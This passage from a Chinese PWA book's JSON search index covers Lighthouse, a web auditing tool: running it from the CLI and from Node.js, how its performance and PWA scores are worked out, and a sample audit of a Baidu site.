] self.addEventListener('install', event => { event.waitUntil( caches.open(CACHE_NAME).then(cache => { // 将列表中的文件进行预缓存 return cache.addAll(URLS_TO_CACHE) }) ) }) 上面的例子其中一部分，/ 就是 App Shell，其他都是其依赖的静态文件，如果采用 SSR，那么 Service Worker 就还需要再进行加工，在前面的章节中也有过介绍。 到这里注册 Service Worker 和编写 Service Worker 都已经完成了，开发者只需要再将 AMP/MIP 中的链接跳转到对应的 PWA 页面即可。 以上就是第九章的全部内容，讲解了 PWA 与搜索如何结合，如何使用 AMP/MIP 来对页面进行加速。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"appendix01/1-lighthouse.html":{"url":"appendix01/1-lighthouse.html","title":"1 使用 Lighthouse 测评 PWA","keywords":"","body":"使用 Lighthouse 测评 PWA Lighthouse 是 Google Chrome 推出的一个开源自动化工具，能够对 PWA 多方面的效果指标进行评测，并给出最佳实践的建议以帮助开发者改进 PWA 的质量。它的使用方法也非常简单，我们只需要提供一个要测评的网址，它将针对此页面运行一系列的测试，然后生成一个有关页面性能的报告。通过报告我们就可以知道需要采取哪些措施来改进应用的性能和体验。 使用入门 针对不同的适用场景，我们可以通过多种方式来安装并使用 Lighthouse： Chrome 浏览器插件。Chrome 插件的形式提供了更加友好的用户界面，方便读取报告。 Chrome DevTools。该工具集成在最新版本的 Chrome 浏览器中，无需安装即可使用。 Lighthouse CLI 命令行工具。方便将 Lighthouse 集成到持续集成系统中。 编程的方式。我们也能通过 Node.js 模块引入 Lighthouse 工具包，以编程的形式来使用它。 下面我们依次介绍上述这几种使用方法。 Chrome 插件 下载 Google Chrome 52 或更高版本，并安装 Ligthouse Chrome 插件。打开需要进行测评的页面，并点击 Chrome 工具栏上的 Lighthouse 图标如下图： 如果在工具栏上没有看到此图标，它可能隐藏在 Chrome 的主菜单中。点击此图标后，我们会看到一个展开菜单，如下图 在 Options 选项里，可以选择需要的测评项，包括性能、无障碍访问性、最佳实践、SEO、PWA，默认情况下，选择全部即可。 点击 Generate report 按钮以针对当前打开的页面运行 Lighthouse 测试。 在完成测评后，Lighthouse 将打开一个新标签，并在页面的结果上显示一个报告。 在这里，我们就能看到关于 PWA, Performance, Accessibility, Best Practices 四个方面存在的问题以及相关建议。根据这些去优化你的站点吧！ Chrome DevTools 在最新版本的 Chrome 浏览器中，Lighthouse 已经直接集成到了调试工具 DevTools 中了，因此不需要进行任何安装或下载。我们先打开需要进行测试的页面，打开 Chrome DevTools，选择 Audits 面板，就能看到 Lighthouse 工具的一些配置选项，选择需要的配置后，点击 Run audits，工具就会对当前页面进行性能的测评。 命令行工具（Lighthouse CLI） 上述两种工具提供了较为基础、快捷的使用方式，针对进阶的高级开发者，Lighthouse 的命令行工具更为合适。它提供了多种详细的使用参数，通过参数的配置，能够更灵活地进行测评并输出报告结果。此外，在一些自动化的持续集成场景中，命令行工具显得十分有用。 安装 安装 Node，需要 Node 8 LTS(8.9) 及以上版本。 以全局方式安装： npm install -g lighthouse # or use yarn: # yarn global add lighthouse 运行 CLI 针对一个页面运行 lighthouse 命令，进行测评： lighthouse https://www.example.com/ 注意： CLI 相较于插件和 DevTools 存在一些尚未修复的问题，比如对 Ubuntu 系统支持不好，会抛 NO_FCP 的错误。对于某些网站支持不好，这些网站可能存在以下特征导致 NO_FCP 错误的发生： 初始渲染的时候页面不包含文本，而只包含一个 spinner 你的站点的启动和渲染主要内容在 5-10s 的延迟之后发生 点击查看最新解决方案 默认情况下，运行报告将以 html 的格式输出在当前目录的 ./_.report.html 文件中，如上述命令结果将存储在 www.example.com_2019-04-02_16-51-15.report.html。我们也可以指定输出的格式与路径，如： lighthouse https://example.com/ --output html --output-path ./report.html 如果需要将结果在标准输出流中以 json 格式输出： lighthouse https://example.com/ --output json 将结果以 json 文件的形式输出到本地目录： lighthouse https://example.com/ --output json --output-path ./myfile.json 输入 --help 选项可以查看可用的输入、输出选项 lighthouse --help 生命周期 Lighthouse 运行测评的过程有一套完整的生命周期，可以划分成三个主要流程：首先是 Collecting 流程，这一步会调用内置的 Driver，其作用是通过 Chrome DevTools Protocol 调起浏览器，并创建新的 tab 请求待测评的站点，通过浏览器采集站点数据并将结果（称之为 Artifacts）保存在本地临时目录。然后进入 Auditing 流程，读取 Artifacts 数据，根据内置的评判策略逐条进行检查并计算出各项的数字形式得分。最后进行 Report 流程，将评分结果按照 PWA、性能、无障碍访问、最佳实践等纬度进行划分，以 JSON、HTML 等格式输出。如下图： 命令行工具基于此提供了生命周期的选项，我们可以让 CLI 只运行整个测评过程的一个或多个特定生命周期。比如，使用 --gather-mode（-G）只进行资源采集的生命周期，命令行工具将会启动浏览器，采集被测试站点的相关数据，并将结果以 json 的形式存储到本地，默认是 ./latest-run/ 目录，然后退出进程： lighthouse https://example.com/ -G 如果想要跳过浏览器的交互，直接从本地读取页面的临时数据，运行测评和产出结果报告，则可以使用 --audit-mode（-A），默认将从 ./latest-run/ 目录读取： lighthouse https://example.com/ -A 两个选项同时使用，就会运行整个测评的生命周期，与直接运行 lighthouse 命令相比，会在当前目录保存一份测试站点的数据。 lighthouse https://example.com -GA 如果不想使用默认的 ./latest-run/ 目录，我们也能自定义站点的 json 数据的保存目录，如： lighthouse -GA=./mycustomfolder https://example.com 编程的方式使用 Lighthouse 除了上述几种方式之外，Lighthouse 也提供了 NPM 包，我们能够以 Node.js 模块的形式引入到项目代码中，结合另一个 NPM 模块 chrome-launcher 用于调起浏览器，就可以随心所欲地以编程的方式使用了。 首先要在项目中安装依赖模块： npm install lighthouse chrome-launcher # yarn add lighthouse chrome-launcher 在使用 lighthouse 接口之前，需要先用启动一个 chrome，所以我们可以封装一个名为 launchChromeAndRunLighthouse 的方法，来完成这两步。chromeLauncher 工具包提供了 launch 方法，接收一个启动所需的参数 opts，这个参数用于配置 chrome 的启动环境、启动方式等，在返回的 promise 对象中，我们能获取到 chrome 实例。再将待测试 url 及 opts 提供给 lighthouse，测试完成后需要关掉 chrome 实例，然后就能拿到我们需要的测试报告 results 了。 const lighthouse = require('lighthouse') const chromeLauncher = require('chrome-launcher') function launchChromeAndRunLighthouse(url, opts, config = null) { return chromeLauncher.launch({chromeFlags: opts.chromeFlags}).then(chrome => { opts.port = chrome.port return lighthouse(url, opts, config).then(results => { return chrome.kill().then(() => results) }) }) } const opts = { chromeFlags: ['--show-paint-rects'] } launchChromeAndRunLighthouse('https://example.com', opts).then(results => { // Use results! }) 值得一提的是这里的 result 包含了多种类型的数据格式，如 results.lhr 是 javascript 对象（Lighthouse Result Object），而 results.report 则是用于 HTML/JSON/CSV 输出结果的字符串，可以按需选择。 性能报告 对于一些只关注应用性能的使用场景，可以用 onlyCategories 配置项来设定只运行性能这个维度的测试： // ... const flags = {onlyCategories: ['performance']} launchChromeAndRunLighthouse(url, flags).then(results => { // Use performance results! }) 除此之外，我们可以自定义自己需要的测评维度，Lighthouse 的 Github 仓库提供了一些自定义的示例和方法。 注意，用编程的方式使用 lighthouse 时，在上述代码的 flags 参数的使用上，与 CLI 的方式有所区别。考虑到以 node 模块引入的情况下，开发者自己来控制这些选项更为简单和灵活，部分 flag 选项值只在 CLI 的模式下生效。node 模块和 CLI 中都能使用的选项值，可以参考 官方的定义。 开启测试日志 如果运行期间需要查看测试的日志，可以引入 lighthouse-logger 模块，它支持打印不同级别的日志。用法如下： const log = require('lighthouse-logger') const flags = {logLevel: 'info'} log.setLevel(flags.logLevel) launchChromeAndRunLighthouse('https://example.com', flags).then(...) 自定义配置 你可能已经注意到 lighthouse 在调用的时候还有第三个参数：lighthouse(url, opts, config)，这个 config 参数能够帮助我们用更细粒度的控制整个测评。这种细粒度的配置在 CLI 中也是支持的，只是使用方式略有区别： 我们可以指定一个配置文件 custom-config.js 如下，它在继承默认的配置的基础上进行了一定的自定义： module.exports = { extends: 'lighthouse:default', settings: { onlyAudits: [ 'first-meaningful-paint', 'speed-index-metric', 'estimated-input-latency', 'first-interactive', 'consistently-interactive', ], }, } 如果使用 CLI，需要用 --config-path 指向该配置文件： lighthouse --config-path=path/to/custom-config.js https://example.com 对于 Node 模块的形式，也基本相似，将配置对象当做 lighthouse 方法的第三个参数传入即可： const lighthouse = require('lighthouse') const config = require('./path/to/custom-config.js') lighthouse('https://example.com/', {port: 9222}, config) 如果评测过程中有这种比较高阶的配置需求，可以详细了解相关的属性文档，这里我们就不作展开了。 除了这些官方提供的工具之外，一些开源项目也将 Lighthouse 进行了集成。例如使用 Webpack 构建的应用，可以使用 webpack-lighthouse-plugin，在构建的过程中完成 Lighthouse 测评；lighthouse-mocha-example 则能够在 Mocha 的测试用例中增加 Lighthouse 的测评项等等，整个工具生态日渐繁荣，相信对于我们测评 PWA 性能，构建更完美的 PWA 大有裨益。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"appendix01/2-lighthouse-score-guide.html":{"url":"appendix01/2-lighthouse-score-guide.html","title":"2 Lighthouse 评分指南","keywords":"","body":"Lighthouse 评分指南 使用 Lighthouse 对网站进行测评后，我们会得到一份评分报告，它包含了性能（Performance），PWA（Progressive Web App），访问无障碍（Accessibility），最佳实践（Best Practice），搜索引擎优化（SEO）等几个部分。这里我们将介绍一下 Lighthouse 是如何计算这几个评分的。 性能评分 性能评分的分值区间是0到100，如果出现0分，通常是在运行 Lighthouse 时发生了错误，如果反复出现了0分的情况，可以在 Lighthouse 的 GitHub 仓库去反馈 bug。满分100分代表了站点已经达到了98分位值的数据，而50分则是75分位值的数据。 影响评分的性能指标 性能测试指标分成了 Metrics，Diagnostic，Opportunities 三部分。通常情况下，只有 Metrics 部分的指标项会对分数产生直接影响，Lighthouse 会衡量以下性能指标项： 首次内容绘制（First Contentful Paint）。即浏览器首次将任意内容（如文字、图像、canvas 等）绘制到屏幕上的时间点。 首次有效绘制（First Meaningful Paint）。衡量了用户感知页面的主要内容（primary content）可见的时间。对于不同的站点，首要内容是不同的，例如：对于博客文章，标题及首屏文字是首要内容，而对于购物网站来说，图片也会变得很重要。 首次 CPU 空闲（First CPU Idle）。即页面首次能够对输入做出反应的时间点，其出现时机往往在首次有效绘制完成之后。该指标目前仍处于实验阶段。 可交互时间（Time to Interactive）。指的是所有的页面内容都已经成功加载，且能够快速地对用户的操作做出反应的时间点。该指标目前仍处于实验阶段。 速度指标（Speed Index）。衡量了首屏可见内容绘制在屏幕上的速度。在首次加载页面的过程中尽量展现更多的内容，往往能给用户带来更好的体验，所以速度指标的值约小越好。 输入延迟估值（Estimated Input Latency）。这个指标衡量了页面对用户输入行为的反应速度，其基准值应低于 50ms。 性能指标评分的计算 每一项性能指标对评分的贡献都有其计算逻辑，Lighthouse 会将原始的性能值映射成为 0-100 之间的数字。评分使用 HTTPArchive 上的真实站点性能数据作为样本，统计出对数正态分布。例如，FMP（First Meaningful Paint）的原始值是从页面初始化开始到主要内容渲染成功的耗时，根据真实站点的数据，顶级性能的站点的 FMP 值约为 1220ms，这个值会被映射成 Lighthouse 的 99 分。 针对不同的评分，Lighthouse 用了不同的颜色进行标注，分值区间和颜色的对应关系如下： 0 - 49（慢）：红色 50 - 89（平均值）： 橙色 90 - 100（快）： 绿色 性能评分的分配权重 各个指标对性能评分的贡献并不相同，Lighthouse 提供了评分详情表，形式如下图，来查阅具体权重分配情况。权重较大的指标，对性能评分的影响更大一些，最终的总体性能评分是这些性能指标分数的加权平均值。我们可以用这个分数计算的表格作为参考，以了解不同的指标是如何影响最终评分的。 从表中可以看出，性能的指标项权重分配如下： 3X - 首次内容绘制 1X - 首次有效绘制 2X - 首次 CPU 空闲 5X - 可交互时间 4X - 速度指标 0X - 输入延迟估值 这些权重的分配方式仍在探究之中，Lighthouse 的团队也在努力试图收集更多站点的数据样本，来将这套计算方法规范化。 减少性能评分的波动 当我们使用 Lighthouse 对实际站点进行测试时，难以避免会有一些影响评分的变量存在。每次访问，站点可能会加载不同的广告、脚本等，网络状况也可能不同。杀毒软件、浏览器插件以及一些其他对页面加载有干预的程序都可能导致评分的较大波动。所以，我们应尽量避免上述因素的影响，以得到更加一致性的数据。可以考虑使用持续集成系统或者第三方服务（如 WebPageTest）进行测试，往往会有更准确的数据。 提高性能评分 前面提到性能评分分为了三部分，Metrics 部分的指标项会直接影响分数，可以作为我们的主要参考点。另外的两部分中， Opportunities 提供了详细的建议和文档，来解释低分的原因，帮助我们具体进行实现和改进。Diagnostics 部分的列表项则为进一步改善性能的实验和调整，给出了指导。这两者不会纳入分数的计算。 PWA 评分 基准指标项 PWA（Progressive Web App）评分的分值区间也是0-100。Lighthouse 使用 PWA 基准检查项列表（Baseline PWA Checklist）进行测评，测评结果将这些指标项分成了四个类别，共包含12个自动测试项和3个手动测试项，其中各个自动测试项的评分权重是相同的。PWA 的评测指标对我们来说非常重要，我们可以从这四个类别详细了解一下基准指标项。 快速可靠 页面在移动网络条件下能够快速加载。 在离线条件下页面能够返回状态码200。这里我们可以通过 Service Worker 来实现离线可用。 start_url 在离线条件下返回状态码200。start_url 是前面章节我们提到过的 manifest.json 中的一个属性，它指定了用户打开该 PWA 时加载的 URL。 可安装 始终使用 HTTPS。 注册 Service Worker 来缓存页面以及 start_url。 使用 manifest 文件来实现安装 PWA 的需求，浏览器能够主动通知用户将应用添加到桌面，增加留存率。 PWA 优化 将 HTTP 流量重定向到 HTTPS。 配置自定义启动画面。 设置地址栏主题颜色。 页面内容针对视口大小自适应，对移动用户的展示更友好。 使用了 标签，并设置了 width 或 initial-scale 属性。 当 JavaScript 文件不可用时，提供降级措施，页面能显示基本内容而不出现白屏。 手动测试项 站点跨浏览器可用，如主流浏览器 Chrome, Edge, Firefox 及 Safari 等。 页面间切换流畅，即使在较差的网络环境下，切换动画也应该简洁顺畅，这是提高用户感知体验的关键。 保证每个页面都有独一无二的 URL，能够在新的浏览器窗口打开，且方便在社交媒体上进行分享。 示范性指标项 除了上述基准指标项之外，为了让 PWA 的体验更加完美，还有 Lighthouse 未实现检查的进阶指标，也就是可以作为示范性参考的 PWA 的指标，这些指标大多需要人工进行确认，它们也分成了几个类别，我们可以针对性地改进 PWA。 可索引 & 社交支持 站点的内容可以被 Baidu，Google 等搜索引擎收录索引。 提供必要的 Schema.org 标记数据，搜索引擎都会依据这些标记来优化搜索结果，让人们更容易找到正确的网页。 提供必要的社交标记数据，如 Twitter 的 标签，能够便于被这些社交站点的爬虫抓取。 提供 Canonical URL，一般适用于页面内容能使用多个 URL 访问的场景。 页面使用 History API，对于单页应用，确保 URL 不要使用片段标识符，如 https://example.com/#!user/26601 中 #！后面的部分。 用户体验 当页面加载时，确保页面内容不跳动或闪烁。 从详情页返回列表页时，记录之前的滚动位置。 输入文字时，键盘不会挡住输入框。 在 Standalone 模式下（从主屏幕启动的情况），页面内容可分享。 在不同的移动设备及桌面电脑上，站点能够自适应。 不要过度使用安装 APP 的推送。 在适当的时候显示添加到桌面的推送，避免打断用户正常使用流程。 性能 首次加载速度尽可能快，即使是在慢速 3G 移动网络下，可交互时间也应该在 5s 以内（在基准指标中，这个时间是 10s）。 缓存 站点使用 cache-first (缓存优先)的缓存策略。尽可能地使用这种策略，确保在慢网络环境和离线环境的加载速度始终相当。 用户处于离线状态时，应当适当地给出通知。可以使用 Network Information API 来实现。 推送通知 告知用户通知功能的使用背景和原因，保证得到许可。 建议用户开启推送通知的 UI 应当尽量友好，不能太强势。 站点显示权限请求时，屏幕的其他主体内容应当适度变暗，让用户更清楚地看到站点需要开启通知权限的理由。 推送通知的内容应当及时、准确，且具有较强的关联性。 给用户提供开启、关闭通知的操作权限。 附加功能点 使用 Credential Management API，帮助用户实现跨设备登录。 使用 Payment Request API，帮助用户方便地调起更友好的原生界面（native UI）进行支付操作。 访问无障碍评分 访问无障碍评分的分值由相关指标的加权平均值计算而来。可以在评分详情查阅每项指标的具体权重。同理，较大权重的指标项对分数的影响较大。无障碍性的每个指标项测试结果为pass或者fail，与性能指标项的计算方式不同，当页面只是部分通过某项指标时，页面的这项指标将不会得分。例如，如果页面中的一些元素有屏幕阅读器友好的命名，而其他的元素没有，那么这个页面的 screenreader-friendly-names 指标项得分为0。 最佳实践评分 最佳实践评分的分数区间为0-100。影响这项评分的指标项的权重都是相同的。如果我们想计算某个指标项对总体评分的贡献，用指标项的数量除以100即可。指标项和权重同样可以参考上文提供的评分详情表，我们可以结合测评结果一一进行优化。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"appendix01/3-lighthouse-case.html":{"url":"appendix01/3-lighthouse-case.html","title":"3 Lighthouse 使用案例","keywords":"","body":"Lighthouse 使用案例 前面两节我们对 Lighthouse 的使用方法和性能评分计算的原理有了一定的了解，下面我们使用 Lighthouse 对一个实际站点 https://lavas.baidu.com/ 进行测试，看看 Lighthouse 能对站点提供哪些方面的改进指导。 对站点进行测试 为了更直观地展示测试结果，我们使用 Chrome Devtools 中集成的 Lighthouse 工具进行测试。 在 Chrome 中打开 https://lavas.baidu.com/ 打开 Chrome Devtools，并选择 Audits 面板 Lighthouse 提供了不同的模拟网络环境选项，我们可以根据需求进行选择，点击 Run Audits 开始测试。 测试结果 稍等片刻，Chrome 会新建一个新的会话窗口，将包含各项评分指标的 Lighthouse 测试报告展示出来，我们可以依次来看： 总体评分 报告的最上方是总体评分，如下图，可以看到站点在性能、PWA、最佳实践及 SEO 方面的表现还是不错的，在无障碍访问指标项上，评分稍低，需要重点进行改进。 具体到每一个方面，都能查看指标项的细节： Performance 性能评分 在选择网络环境为 No throttling 的条件下，FCP，FMP，首次交互时间等指标都能得到详细的统计，View Trace 还能看到页面每一帧的渲染过程。 Metrics 部分的指标与性能评分关联紧密，可以看到各个指标项都显示绿色，意味着它们都得到了 90-100 的分值。Opportunities 和 Diagnostics 部分的指标项虽然不纳入评分的计算，但也给我们改进提供了参考。可以看到站点存在字体文件加载优化、静态资源缓存等问题。 PWA 评分 在基准指标检查中，有一项未通过：Lighthouse 建议站点需要对 JavaScript 脚本不能正确加载的情况作降级处理。我们需要改进的是，页面的核心渲染脚本加载失败时，仍能够展示基本的静态内容，而不是空白页面，这一点在客户端渲染的 SPA 应用中尤其需要引起重视。除此之外，我们可以看到站点的其他 PWA 自动检查项都已经通过，然后手动检查一下跨浏览器兼容性、页面切换流畅度、页面 URL 等检查项即可。 无障碍访问评分 此项评分偏低，仅得到62分，说明站点在这部分存在的问题较多。展开可以看到问题的详情，如 DOM 元素使用不规范、结构不合理，页面颜色对比度不够，Meta 信息使用不正确等等，如果需要提高站点的无障碍可访问性，我们可以从这些方面对症下药进行完善。 Best Practices 最佳实践评分 站点在这部分的表现中规中矩，通过了15个检查项中的12个，暴露了3个问题，资源推荐使用 http2，跨域的跳转链接需要使用 rel 标识，不能使用废弃的 API。不通过检查测试，开发中我们很难注意到这些细节问题。 SEO 搜索引擎优化评分 结果显示站点的 robots.txt 文件缺失，需要改进。 小结 通过上述简单演示，我们对站点的各项指标就能有较为直观的了解，评分高的指标项值得积累开发经验，评分低的指标，对照着测试报告给出的建议，我们可以逐一完善。 Lighthouse 是一个开源的项目，主要由 Google Chrome 团队开发维护，它包含了强大的功能和较为繁荣的周边生态，本章只是就其使用方式、打分机制、测评指标等作了简要的介绍，在实际的 PWA 工程中，我们可能会运用到更详细的配置选项和测试参数，或者需要深入了解其运行原理，这些都可以通过 Github 上的项目文档进一步学习和实践。工欲善其事，必先利其器，有了 Lighthouse 这把利器的帮助，我们打造体验更好的 PWA 站点将不再是难事！ Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-04-25 17:03:59 "},"thanks.html":{"url":"thanks.html","title":"感谢","keywords":"","body":"致谢 最后，感谢所有参与本书编写、核定、排版的小伙伴，感谢你们辛勤的付出，相信 Web，相信 PWA ！ Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "}}